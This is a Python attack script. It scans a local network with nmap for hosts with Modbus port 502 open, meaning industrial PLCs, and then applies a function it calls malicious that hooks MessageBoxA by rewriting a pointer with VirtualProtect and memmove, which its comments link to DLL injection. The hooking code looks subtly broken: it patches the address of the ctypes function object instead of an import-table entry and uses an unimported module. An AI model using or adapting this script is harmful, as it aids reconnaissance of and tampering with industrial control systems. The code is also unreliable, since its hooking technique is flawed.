import ctypes
import socket
import struct
import nmap

# Function to scan the network for the PLC's IP
def find_plc_ip(network_range="192.168.1.0/24"):
    nm = nmap.PortScanner()
    
    # Scan for devices with an open port (assuming typical PLC ports like 502 for Modbus)
    nm.scan(hosts=network_range, arguments='-p 502 --open')
    
    for host in nm.all_hosts():
        print(f"Potential PLC found at: {host}")
        return host  # Return the PLC's IP if found
    
    return None  # Return None if no PLC is found

# IAT Hooking function
def iat_hooking():
    kernel32 = ctypes.windll.kernel32
    user32 = ctypes.windll.user32

    # Define prototype of MessageBoxA
    original_msgbox = user32.MessageBoxA
    original_msgbox.argtypes = [ctypes.wintypes.HWND, ctypes.wintypes.LPCSTR, ctypes.wintypes.LPCSTR, ctypes.wintypes.UINT]
    original_msgbox.restype = ctypes.wintypes.INT

    # Define the malicious function to replace the original MessageBoxA
    def hooked_message_box(hwnd, text, caption, flags):
        print("[*] Hooked function called!")
        return original_msgbox(hwnd, b"Hacked!", b"Hooking Test", flags)
    
    # Convert function to C function pointer
    HOOK_FUNCTYPE = ctypes.WINFUNCTYPE(ctypes.wintypes.INT, ctypes.wintypes.HWND, 
                                       ctypes.wintypes.LPCSTR, ctypes.wintypes.LPCSTR, 
                                       ctypes.wintypes.UINT)
    hooked_func = HOOK_FUNCTYPE(hooked_message_box)
    
    # Setting up the IAT hooking - Typically done via a DLL injection attack in real cases
    iat_pointer = ctypes.c_void_p.from_address(ctypes.addressof(original_msgbox))
    kernel32.VirtualProtect(iat_pointer, ctypes.sizeof(ctypes.c_void_p), 
                            0x40, ctypes.byref(ctypes.c_ulong()))
    ctypes.memmove(iat_pointer, ctypes.addressof(hooked_func), ctypes.sizeof(ctypes.c_void_p))

    print("[+] IAT Hooking done. MessageBoxA function is now hijacked.")

# Main execution flow
if __name__ == "__main__":
    plc_ip = find_plc_ip()
    
    if plc_ip:
        print(f"Identified PLC IP: {plc_ip}")
    else:
        print("No PLC found on network.")

    # Execute the hooking function
    iat_hooking()